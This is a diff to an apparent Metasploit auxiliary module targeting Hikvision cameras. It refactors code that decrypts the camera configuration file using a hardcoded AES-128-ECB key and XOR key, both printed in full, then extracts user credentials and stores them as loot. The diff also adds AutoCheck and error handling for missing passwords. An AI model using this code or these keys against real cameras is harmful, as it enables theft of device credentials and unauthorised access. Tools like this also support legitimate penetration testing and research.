@@ -7,8 +7,14 @@ class MetasploitModule < Msf::Auxiliary
 
   require 'openssl'
 
+  prepend Msf::Exploit::Remote::AutoCheck
+
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+
+  # AES hex encryption key and XOR key defined constants used to decrypt the camare configuration file
+  AES_KEY = '279977f62f6cfd2d91cd75b889ce0c9a'.freeze
+  XOR_KEY = "\x73\x8b\x55\x44".freeze
 
   def initialize(info = {})
     super(
@@ -113,11 +119,11 @@ class MetasploitModule < Msf::Auxiliary
       # decrypt configuration file data with the weak AES128-ECB encryption hex key: 279977f62f6cfd2d91cd75b889ce0c9a
       decipher = OpenSSL::Cipher.new('aes-128-ecb')
       decipher.decrypt
-      decipher.key = ['279977f62f6cfd2d91cd75b889ce0c9a'].pack('H*') # transform hex key to 16 bits key
+      decipher.key = [AES_KEY].pack('H*') # transform hex key to 16 bits key
       xor_data = decipher.update(aes_data.body) + decipher.final
 
       # decode the AES decrypted configuration file data with xor key: 73 8B 55 44
-      file_data = Rex::Text.xor("\x73\x8b\x55\x44".b, xor_data)
+      file_data = Rex::Text.xor(XOR_KEY.b, xor_data)
 
       # extract text chunks with regular expression below...
       text_data = file_data.scan(%r{[0-9A-Za-z_\#~`@|\\/=*\^:"'.;{}?\-+&!$%()\[\]<>]+}x)
@@ -146,13 +152,17 @@ class MetasploitModule < Msf::Auxiliary
         loot_data << "User Credentials Information:\n"
         loot_data << "-----------------------------\n"
         xml_creds_info.css('User').each do |user|
-          unless text_data.nil?
+          unless text_data.empty?
             # Filter out password based on user name and store credentials in the database
             i = text_data.each_with_index.select { |text_chunk, _index| text_chunk == user.at_css('userName').content }.map { |pair| pair[1] }
-            pwd = text_data[i.last + 1]
-            report_creds(user.at_css('userName').content, pwd)
+            if i.empty?
+              print_error("Could not retrieve password for user:#{user.at_css('userName').content} from the camera configuration file!")
+            else
+              pwd = text_data[i.last + 1]
+              report_creds(user.at_css('userName').content, pwd)
+            end
           end
-          loot_data << "Username:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | Role:#{user.at_css('userLevel').content} | Password: #{pwd}\n"
+          loot_data << "User:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | Role:#{user.at_css('userLevel').content} | Password: #{pwd}\n"
         end
       end
     else
@@ -268,7 +278,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error('Response code invalid for obtaining camera storage configuration.')
     end
     unless loot_data.nil?
-      if datastore['PRINT'] == true
+      if datastore['PRINT']
         print_status(loot_data.to_s)
       end
       loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], loot_data, 'configuration', 'camera configuration')
@@ -311,8 +321,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    return unless check == Exploit::CheckCode::Vulnerable
-
     case action.name
     when 'Automatic'
       print_status('Running in automatic mode')
